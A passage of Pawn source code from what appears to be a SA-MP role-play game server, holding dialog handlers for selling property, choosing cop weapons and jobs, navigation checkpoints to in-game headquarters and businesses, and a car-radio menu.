        SaveKonVal(playerid, "pPbiskey", 9999);
        //SaveAccount(playerid);
        SCM(playerid,COLOR_ALI,"You sold your biz successfully.");
        PlayerPlaySound(playerid,1052,0,0,0);
        return 1;
    }
    if(dialogid == 9744)
    {
        if(PINFO[playerid][pPbiskey] == 9999) return SCM(playerid,COLOR_ALI,"You haven't any business.");
        new buz = PINFO[playerid][pPbiskey];
        if(buz < 500) return SCM(playerid,COLOR_ALI,"Error.");
        if(!IsPlayerInRangeOfPoint(playerid,5,SBizzInfo[buz-500][sbEntranceX],SBizzInfo[buz-500][sbEntranceY],SBizzInfo[buz-500][sbEntranceZ])) return SCM(playerid,COLOR_ALI,"You must be near of the biz door.");
        new price = ((SBizzInfo[buz-500][sbBuyPrice] * 50)/(100));
        GivePlayerPool(playerid,price);
        SBizzInfo[buz-500][sbOwned] = 0;
        format(SBizzInfo[buz-500][sbOwner],64,"The State");
        OnSbizUpdate(buz-500);
        PINFO[playerid][pPbiskey] = 9999;
        SaveKonVal(playerid, "pPbiskey", 9999);
        //SaveAccount(playerid);
        SCM(playerid,COLOR_ALI,"You sold your biz successfully.");
        PlayerPlaySound(playerid,1052,0,0,0);
        return 1;
    }
if(dialogid == 4576)
{
    if(!response) return 1;
    new house = PlayerInfo[playerid][pPhousekey],price = (HouseInfo[PlayerInfo[playerid][pPhousekey]][hValue]*40/100);
    if(house == 9999 || strcmp(HouseInfo[house][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
    HouseInfo[house][hOwned] = 0;
    SaveKonValH(house, "hOwned", 0);
    strmid(HouseInfo[house][hOwner],"The State",0,strlen("The State"),40);
    SaveKonStrH(house, "hOwner", "The State");
    EvictAllFromHouse(house);
    GivePlayerPool(playerid,price);
    new strlool[512];
    format(strlool,512,"You sell your house to state for $%s",FormatNumber(price));
    SCM(playerid,COLOR_LIGHTRED,strlool);
    PINFO[playerid][pPhousekey] = 9999;
    SaveKonVal(playerid, "pPhousekey", 9999);
    RemovePlayerMapIcon(playerid, 30);
    if(PINFO[playerid][gParked] == 1)
    {
        CreateVehGarage(playerid);
        SCM(playerid,COLOR_Good,"Your first car have been evicted from the parking.");
    }
    if(PINFO[playerid][gParked_2] == 1)
    {
        CreateVehGarage_2(playerid);
        SCM(playerid,COLOR_Good,"Your first car have been evicted from the parking.");
    }
    return 1;
}
if(dialogid == 7532)
{
new house = PlayerInfo[playerid][pPhousekey];
if(response)
{
if(house == 9999) return SCM(playerid,COLOR_ALI,"You haven' a House.");
HouseInfo[house][hHel] = 1;
SaveKonValH(house, "hHel", 1);
GivePlayerPool(playerid,-500);
SBizzInfo[6][sbTill] += 500;
SBizzInfo[6][sbProducts]--;
PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
SendClientMessage(playerid, COLOR_Good, "You can now heal yourself at home, Type /heal.");
}
}
if(dialogid == 21356)
{
if(response)
{
if(!IsACop(playerid)) return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
if(listitem == 0)
{
wepidw[playerid] = 31;
}
if(listitem == 1)
{
wepidw[playerid] = 29;
}
if(listitem == 2)
{
wepidw[playerid] = 24;
}
if(listitem == 3)
{
wepidw[playerid] = 33;
}
if(listitem == 4)
{
wepidw[playerid] = 25;
}
if(listitem == 5)
{
wepidw[playerid] = 23;
}
if(listitem == 6)
{
wepidw[playerid] = 30;
}
ShowPlayerDialog(playerid,32366,DIALOG_STYLE_INPUT,"Ammo:","Choose bullets between 1 and 1000","Select","Cancel");
}
}
if(dialogid == 32366)
{
if(response)
{
if(!IsACop(playerid)) return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
if(strval(inputtext) >= 1 && strval(inputtext) <= 1000)
{
Ammom[playerid] = strval(inputtext);
GivePlayerTofang(playerid,wepidw[playerid],Ammom[playerid]);
PlayerPlaySound(playerid,1052,0.0,0.0,0.0);
}
else
{
ShowPlayerDialog(playerid,32366,DIALOG_STYLE_INPUT,"Ammo:","Choose bullets between {FF6347}1 and 1000!","Select","Cancel");
}
}
}

    if(dialogid == 2555)
    {
        if(response)
        {
    if(OnCheckpoint[playerid] == 1)
    {
    SCM(playerid,COLOR_LIGHTRED,"You already have an enable checkpoint.");
    return 1;
    }
            new message[256+1];
            if(listitem == 0)
            {
            format(message, 256, "You Selected Detective job, a Legal job, I give you a checkpoint to follow this job", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 54654;
            SetPlayerCheckpoint(playerid, 1481.0289,-1770.9703,18.7958, 3);
            }
            if(listitem == 1)
            {
              format(message, 256, "You Selected Lawyer job, a Legal job, I give you a checkpoint to follow this job", listitem);
              SendClientMessage(playerid, 0xFFFFFFFF, message);
              OnCheckpoint[playerid] = 1;
              CP[playerid] = 54655;
              SetPlayerCheckpoint(playerid, 1481.0289,-1770.9703,18.7958, 3);
            }
            if(listitem == 2)
            {
              format(message, 256, "You Selected Drugs Dealer job, a Illegal job, I give you a checkpoint to follow this job", listitem);
              SendClientMessage(playerid, 0xFFFFFFFF, message);
              OnCheckpoint[playerid] = 1;
              CP[playerid] = 54656;
              SetPlayerCheckpoint(playerid, 2165.875732,-1671.250000,15.073156, 3);
            }
            if(listitem == 3)
            {
              format(message, 256, "You Selected Car Jacker job, a Illegal job, I give you a checkpoint to follow this job", listitem);
              SendClientMessage(playerid, 0xFFFFFFFF, message);
              OnCheckpoint[playerid] = 1;
              CP[playerid] = 54657;
              SetPlayerCheckpoint(playerid, 2515.572265,-1473.751220,24.009740, 3);
            }
            if(listitem == 4)
            {
              format(message, 256, "You Selected Car mechanic job, a Legal job, I give you a checkpoint to follow this job", listitem);
              SendClientMessage(playerid, 0xFFFFFFFF, message);
              OnCheckpoint[playerid] = 1;
              CP[playerid] = 54658;
              SetPlayerCheckpoint(playerid, 1658.4885,2199.7075,10.8203, 3);
            }
            if(listitem == 5)
            {
              format(message, 256, "You Selected Bus Driver job, a Legal job, select job location( LS or LV )", listitem);
              SendClientMessage(playerid, 0xFFFFFFFF, message);
              ShowPlayerDialog(playerid, 1298, DIALOG_STYLE_LIST, "Bus Job Location", "Bus job on Los santos \nBus job on Las ventarus", "Select", "Cancel");
            }
            if(listitem == 6)
            {
              format(message, 256, "You Selected Trucker job, a Legal job, I give you a checkpoint to follow this job", listitem);
              SendClientMessage(playerid, 0xFFFFFFFF, message);
              OnCheckpoint[playerid] = 1;
              CP[playerid] = 54670;
              SetPlayerCheckpoint(playerid, -77.235397,-1136.455932,1.078125, 3);
            }
            if(listitem == 7)
            {
            format(message, 256, "You Selected Farmer job, a Legal job, select job location( 1 or 2 )", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            ShowPlayerDialog(playerid, 1299, DIALOG_STYLE_LIST, "Farmer job locations:", "Farm 1 \nFarm 2", "Select", "Cancel");
            }
            if(listitem == 8)
            {
            format(message, 256, "You Selected Arms Dealer job, a Illegal job, I give you a checkpoint to follow this job", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 78642;
            SetPlayerCheckpoint(playerid,2440.481201,-1970.118164,13.546875,3);
            }
            if(listitem == 9)
            {
            SCM(playerid,COLOR_WHITE,"You Selected Garbage man job, a Legal job, I give you a checkpoint to follow this job");
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 79655;
            SetPlayerCheckpoint(playerid,2077.161376,-2006.656250,13.546875,3);
            }
            if(listitem == 10)
            {
            format(message, 256, "Shoma Shoghle Ranande Sherkat Ra Entekhab Kardid , Be Check point Moshakhas Shode Boro", listitem);
            SendClientMessage(playerid, 0xFFFFFFFF, message);
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 812912;
            SetPlayerCheckpoint(playerid,1612.7501,-1839.9008,13.5223,3);
            }
        }
    }

    if(dialogid == 998860)
    {
        if(response)
        {
            if(listitem == 0)
            {
        SetPlayerSkin(playerid, 250);
    }
    if(listitem == 1)
            {
	SetPlayerColor(playerid,TEAM_HIT_COLOR);
    }
    if(listitem == 2)
            {
	SetPlayerSkin(playerid,PlayerInfo[playerid][fSkin]);
	SetPlayerToTeamColor(playerid);
    }
        }
	}
 if(dialogid == 998877)
    {
        if(response)
        {
            if(listitem == 0)
            {
    ShowPlayerDialog(playerid, 9988770, DIALOG_STYLE_LIST, "Faction HQs", "Police Department \nFBI \nNational Guard \nFire & Medics \nSilence Mafia \nThe Killers \nMayor \nHitmen Agency \nNews Reporters \nTaxi Driver \nSchool Instructor \nDangerous Tigers \nLegendary Men \nFast N Furious Family \nStorm Men Family \nTow Car Company \nThe Racers \nSFPD \n[TT]Clan \n[GG]Clan \n[Mr]Clan \nSchool Instructor LV \nTaxi Driver LV \nEvil Clan", "Select", "Cancel");
    }
    if(listitem == 1)
            {
    ShowPlayerDialog(playerid,9988771,DIALOG_STYLE_LIST, "Important Locations" , "City Hall","Select","Cancel");
    }
    if(listitem == 2)
            {
   //SCM(playerid,COLOR_WHITE,"Use /Bizzes And /FindBiz [BizID]");
   ShowPlayerDialog(playerid,9988772,DIALOG_STYLE_LIST, "Important Bizzes" , "Los Santos Gun Shop \nLas Venturas Gun Shop \nLos Santos Restaurant \nLas Venutra Foyr Dragons Casino \nJizzy Club \nAlhanbra Night Club \nPig Pen \nLS GYM \nBank LS \nBank LV \nThe Craw bar LV \nLS BAR \nCASINO LV \nCrack House \nSan Fiero Casino \nSan Fiero Club \nSan Fiero Gun Shop \nBANK SF","Select","Cancel");
    }
	if(listitem == 3)
            {
	//SCM(playerid,COLOR_WHITE,"Use /SBizzes And /FindSBiz [SBizID]");
    ShowPlayerDialog(playerid,9988773,DIALOG_STYLE_LIST,"Important Special Bizzes" , "Scooter Rent \nLas Venturas Rent Car \nBoat Rent \nLV CNN Studio \nRent Car LS \nLos Santos House Upgrade \nLS Cnn \nTow Car \nPaintball Arena \nKart Track \nCommunication Center \nLos Santos Tuning \nLos Santos Tuning \nLas Ventarus Tuning \nWheel Arch Angels \nSan Fiero Tuning","Select","Cancel");
    }
        }
	}
 if(dialogid == 9988770)
    {
        if(response)
        {
    if(listitem == 0)
            {
    SetPlayerCheckpoint(playerid,1554.9537,-1675.6584,16.1953,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Police Departement. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 1)
            {
    SetPlayerCheckpoint(playerid,2287.0576,2432.1121,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : FBI. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 2)
            {
    SetPlayerCheckpoint(playerid,73.984298,1917.414550,17.640625,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : National Guard. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 3)
            {
    SetPlayerCheckpoint(playerid,1607.520996,1815.756591,10.820312,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Fire & Medics LS. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 4)
            {
    SetPlayerCheckpoint(playerid,725.5550,-1451.0232,17.6953,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Silence Mafia. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 5)
            {
    SetPlayerCheckpoint(playerid,1456.7424,2773.4614,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : The Killers Family. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 6)
            {
    SetPlayerCheckpoint(playerid,1481.0206,-1771.1138,18.7958,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Mayor (City Hall). Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 7)
            {
    SetPlayerCheckpoint(playerid,1080.997192,-345.408233,73.984069,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Hitmen Agency. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 8)
            {
    SetPlayerCheckpoint(playerid,-329.770111,1536.920532,76.611709,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : News Reporters. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 9)
            {
    SetPlayerCheckpoint(playerid,1755.6456,-1894.1962,13.5566,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Taxi Driver LS. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 10)
            {
    SetPlayerCheckpoint(playerid,1174.0846,1351.0155,10.9219,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : School Instructor LS. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 11)
            {
    SetPlayerCheckpoint(playerid,2637.4326,2352.0256,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Dangerous Tigers Family. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 12)
            {
    SetPlayerCheckpoint(playerid,1122.7065,-2037.0063,69.8942,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Legendary Men Family. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 13)
            {
    SetPlayerCheckpoint(playerid,1455.4546,750.9794,11.0234,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Fast N Furious. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 14)
            {
    SetPlayerCheckpoint(playerid,2792.800292, -1087.528320, 30.718750,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Storm Men Family. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 15)
            {
    SetPlayerCheckpoint(playerid,912.2000,-1234.9801,17.2109,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Tow Car Company. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 16)
            {
    SetPlayerCheckpoint(playerid,-2720.359619, -318.036743, 7.843750,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : The Racers Family. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 17)
            {
	SetPlayerCheckpoint(playerid,-1590.711914,661.227416,7.187500,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : San Fiero Police Departement. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 18)
            {
    SetPlayerCheckpoint(playerid,2232.425537,-1159.585205,25.890625,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : [TT]Clan. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 19)
            {
    SetPlayerCheckpoint(playerid,1653.836059,-1654.757690,22.515625,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : [GG]Clan. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 20)
            {
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : [TT]Clan. Use /recp For Delete Checkpoint.");
	//OnCheckpoint[playerid] = 1;
	//CP[playerid] = 9922555;
    }
    if(listitem == 21)
            {
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : School Instructor LV. Use /recp For Delete Checkpoint.");
    SetPlayerCheckpoint(playerid,413.9613,2536.5122,19.1484,3.0);
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 22)
            {
    SetPlayerCheckpoint(playerid,937.3935,1733.2067,8.8516,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Taxi Driver LV. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 23)
            {
    SetPlayerCheckpoint(playerid,2140.929199,-1801.968017,16.147472,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Evil Clan. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
        }
	}

 if(dialogid == 9988772)
    {
        if(response)
        {
    if(listitem == 0)
            {
    SetPlayerCheckpoint(playerid,1791.21,-1164.63,23.8281,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Los Santos Gun Shop. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 1)
            {
    SetPlayerCheckpoint(playerid,2596.7,1095.65,10.8219,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Las Venturas Gun Shop. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 2)
            {
	SetPlayerCheckpoint(playerid,1498.36,-1583.03,13.5466,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Los Santos Restaurant. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 3)
            {
    SetPlayerCheckpoint(playerid,2019.64,1007.71,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Las Venutra Foyr Dragons Casino. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 4)
            {
    SetPlayerCheckpoint(playerid,2017.5,1919.8,12.3422,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Jizzy Club. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 5)
            {
    SetPlayerCheckpoint(playerid,1836.36,-1682.52,13.3513,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Alhanbra Night Club. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 6)
            {
    SetPlayerCheckpoint(playerid,2421.5,-1219.24,25.5617,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Pig Pen. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 7)
            {
    SetPlayerCheckpoint(playerid,2229.91,-1721.3,13.5614,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : LS GYM. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 8)
            {
    SetPlayerCheckpoint(playerid,2229.91,-1721.3,13.561,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Bank LS. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 9)
            {
    SetPlayerCheckpoint(playerid,2577.48,1325.42,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Bank LV. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 10)
            {
    SetPlayerCheckpoint(playerid,-2766.53,375.354,6.3344,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Bank SF. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 11)
            {
    SetPlayerCheckpoint(playerid,2441.12,2065.4,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : The Craw bar LV. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 12)
            {
    SetPlayerCheckpoint(playerid,2308.56,-1643.95,14.8268,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : LS BAR. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 13)
            {
    SetPlayerCheckpoint(playerid,2441.17,2163.53,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : CASINO LV. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 14)
            {
    SetPlayerCheckpoint(playerid,2165.88,-1671.25,15.0732,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : Crack House. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 15)
            {
    SetPlayerCheckpoint(playerid,-2550.75,193.789,6.2265,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : San Fiero Casino. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 16)
            {
    SetPlayerCheckpoint(playerid,-2624.97,1412.7,7.0935,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : San Fiero Club. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 17)
            {
    SetPlayerCheckpoint(playerid,-2626.45,208.24,4.8125,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Biz : San Fiero Gun Shop. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
        }
	}
  if(dialogid == 9988773)
    {
        if(response)
        {
    if(listitem == 0)
            {
    SetPlayerCheckpoint(playerid,1847.55,-1871.74,13.5781,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Scooter Rent. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 1)
            {
    SetPlayerCheckpoint(playerid,2200.78,1393.6,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Las Venturas Rent Car. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 2)
            {
	SetPlayerCheckpoint(playerid,1606.29,620.901,10.8219,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Boat Rent. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 3)
            {
    SetPlayerCheckpoint(playerid,2079.39,2046.17,11.0579,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : LV CNN Studio. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 4)
            {
    SetPlayerCheckpoint(playerid,564.942,-1292.23,17.2481,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Rent Car LS. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 5)
            {
    SetPlayerCheckpoint(playerid,2351.88,-1412.15,23.9923,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Los Santos House Upgrade. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 6)
            {
    SetPlayerCheckpoint(playerid,844.656,-1045.56,25.43,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : LS Cnn. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 7)
            {
    SetPlayerCheckpoint(playerid,2510.6,-1468.2,24.0237,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Tow Car. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 8)
            {
    SetPlayerCheckpoint(playerid,1310.13,-1367.81,13.5408,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Paintball Arena. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 9)
            {
    SetPlayerCheckpoint(playerid,2281.91,-2364.28,13.5937,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Kart Track. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 10)
            {
    SetPlayerCheckpoint(playerid,1154.02,-1772.44,16.5991,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Communication Center. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 11)
            {
    SetPlayerCheckpoint(playerid,1046.14,-1028.22,32.1016,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Los Santos Tuning. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 12)
            {
    SetPlayerCheckpoint(playerid,2650.86,-2040.98,13.55,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Los Santos Tuning. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 13)
            {
    SetPlayerCheckpoint(playerid,2380.83,1041.26,10.8203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Las Ventarus Tuning. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 14)
            {
    SetPlayerCheckpoint(playerid,-2714.92,223.057,4.3281,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : Wheel Arch Angels. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
    if(listitem == 15)
            {
    SetPlayerCheckpoint(playerid,-1942.97,237.903,34.1203,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For Special Biz : San Fiero Tuning. Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
        }
	}
 if(dialogid == 9988771)
    {
        if(response)
        {
            if(listitem == 0)
            {
    SetPlayerCheckpoint(playerid,1481.0206,-1771.1138,18.7958,3.0);
    SendClientMessage(playerid, COLOR_BLUE, "Goto CheckPoint For HQ : Mayor (City Hall). Use /recp For Delete Checkpoint.");
	OnCheckpoint[playerid] = 1;
	CP[playerid] = 9922555;
    }
	}
        }
  if(dialogid == 6543)
    {
        if(response)
        {
            if(listitem == 0) ShowPlayerDialog(playerid, 6542, DIALOG_STYLE_LIST, "Musics", "Radio Javan \nShohre \nTikTak - In Lahze Ha \nHoroshBand \nMohsen EbrahimZade \nSadegh - Sangin (Ho3ein) \nZedBazi - Mehmooni Khodemoone \nYas - Gheseye Zir Zamin \nMorteza Pashei - Asre Paiezi \nMorteza Pashei - Yeki Hast \nMorteza Pashei - Mohsen EbrahimZade - Havaei Shodi \nShad (Aroosi)", "Select", "Cancel");
			if(listitem == 1) ShowPlayerDialog(playerid,6541,DIALOG_STYLE_INPUT,"URL :","Insert Your Music URL / Start With http://","Select","Cancel");
            if(listitem == 2) StopAudioStreamForPlayer(playerid);
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) {PlayAudioStreamForPlayer(i, CarRadio[GetPlayerVehicleID(playerid)]); CarRadioPlayed[i] = true;}
        }
              return 1;
            }
        }
    if(dialogid == 6541)
    {
            if(!response)
            {
             // This is neccessary so that if a player cancels it doesn't play a blank stream for players.
            }
            else if(strlen(inputtext) < 64 || strlen(inputtext) > 0)
            {
                new vehicle = GetPlayerVehicleID(playerid);
                for(new i; i < MAX_PLAYERS; i++)
                {
